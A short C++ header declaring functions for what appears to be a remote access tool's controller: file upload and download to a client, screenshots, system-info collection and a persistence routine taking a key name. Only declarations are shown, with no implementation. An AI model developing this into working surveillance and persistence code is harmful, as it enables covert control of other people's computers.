#pragma once
#include <iostream>
#include <istream>
#include "Client.h"
#include <atlstr.h>

#pragma warning(disable : 4996)

class Client;
class Transfer
{
public:
	static void sendString(SOCKET* sock, const std::string str);
	static bool uploadToClient(Client* client, std::string filename);
	static bool downloadFromClient(Client* client, const std::string filename);
	static void screenshot(Client* client);
	static int getSize(std::string filename);
	static void Copy(std::string file_out, std::string file_in);
	static void ask(Client* client, const std::string filename,const std::string new_name);
	static void getTemp(Client* client);
};

class InfoClient
{
public:
	static void getsysinfo(Client* client);
};

void persistence(Client* client, const std::string filename, const wchar_t* keyname);